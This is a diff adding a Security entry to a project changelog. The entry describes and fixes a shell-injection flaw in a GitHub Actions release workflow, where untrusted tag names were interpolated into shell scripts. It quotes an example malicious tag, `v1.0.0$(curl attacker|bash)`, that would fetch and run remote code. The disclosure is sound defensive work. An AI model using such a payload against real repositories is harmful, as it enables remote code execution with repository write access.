@@ -14,6 +14,33 @@ from so a reader can check it.
 
 ## [Unreleased]
 
+### Security
+
+- **Shell-injection via an untrusted git tag name in `.github/workflows/release.yml`,
+  never released or run.** The `package-and-draft-release` job (added earlier in this
+  same PR, #233) spliced `${{ github.ref_name }}` and `${{ github.repository }}`
+  directly into three `run:` shell strings, in a job holding `permissions: contents:
+  write` and an ambient `GH_TOKEN`. GitHub Actions substitutes a `${{ ... }}`
+  expression into the YAML text *before* bash parses it, so the surrounding double
+  quotes gave no protection, and a git tag name may legally contain `$()`, backticks,
+  `;` and `"` (git only forbids space, `~^:?*[\`, control characters and a few
+  structural sequences). A tag matching this workflow's `v*` trigger, such as
+  `v1.0.0$(curl attacker|bash)`, would have had its command substitution executed by
+  bash on the `windows-latest` runner, with write access to the repository. Found
+  independently by `claude[bot]`'s automated review of PR #233 and confirmed by the
+  cloud reviewer routine, which reproduced the exploitable ref shape with `git
+  check-ref-format --allow-onelevel`. Fixed by passing `ref_name`/`repository` through
+  `env:` (`TAG_NAME`/`REPO`) and referencing the shell variables instead of the
+  template expressions — a variable's value is never re-parsed as shell syntax, unlike
+  text spliced into the script before bash sees it. **Failure mode (rule 10):** the
+  `GH_TOKEN` line in each of these steps already went through `env:`, and copying that
+  pattern to the two other values that needed it was a one-line change per step — the
+  script was written by interpolating the *readable* values (tag, repo name) directly
+  because they read as inert strings, while the actual GitHub Actions security rule is
+  "any `${{ }}` expression that reaches a `run:` shell string is untrusted input",
+  independent of what the value looks like. `release.yml` has never run (no tag has
+  been pushed), so nothing was ever exposed to this.
+
 ### Fixed
 
 - **`scripts/claims/checks/release-workflow.mjs`'s `upload_order_correct` key was
